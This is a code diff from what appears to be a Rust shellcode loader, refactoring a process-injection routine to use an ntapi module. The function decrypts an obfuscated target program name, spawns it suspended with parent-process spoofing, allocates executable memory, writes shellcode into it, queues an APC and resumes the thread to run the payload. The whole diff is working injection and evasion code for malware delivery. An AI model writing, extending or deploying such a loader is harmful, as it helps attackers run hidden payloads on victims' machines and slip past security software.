@@ -1,5 +1,4 @@
-use crate::api::*;
-use windows_sys::Win32::System::Threading::CREATE_SUSPENDED;
+use crate::ntapi::{alloc_virtual_memory_at, PAGE_EXECUTE_READWRITE, write_virtual_memory, queue_apc_thread, resume_thread, close_handle};
 
 #[cfg(feature = "run_process_hollowing")]
 pub unsafe fn exec(shellcode_ptr: usize, shellcode_len: usize) -> Result<(), String> {
@@ -13,7 +12,7 @@ pub unsafe fn exec(shellcode_ptr: usize, shellcode_len: usize) -> Result<(), Str
     let target_program = simple_decrypt(env!("RSL_ENCRYPTED_TARGET_PROGRAM"));
 
     // 1. Create suspended process
-    let process_info = crate::api::create_process_with_spoofing(target_program.as_str(), true)?;
+    let process_info = crate::ntapi::create_process_with_spoofing(target_program.as_str(), true)?;
 
     // 2. Allocate memory for shellcode
     let remote_mem = alloc_virtual_memory_at(
@@ -24,13 +23,13 @@ pub unsafe fn exec(shellcode_ptr: usize, shellcode_len: usize) -> Result<(), Str
     )?;
 
     // 3. Write shellcode
-    write_virtual_memory(process_info.hProcess, remote_mem, shellcode)?;
+    write_virtual_memory(process_info.hProcess, remote_mem, shellcode).map(|_| ())?;
 
     // 4. Queue APC to execute shellcode
     queue_apc_thread(process_info.hThread, remote_mem)?;
 
     // 5. Resume thread to execute APC
-    resume_thread(process_info.hThread)?;
+    resume_thread(process_info.hThread).map(|_| ())?;
 
     // Close handles
     close_handle(process_info.hThread);
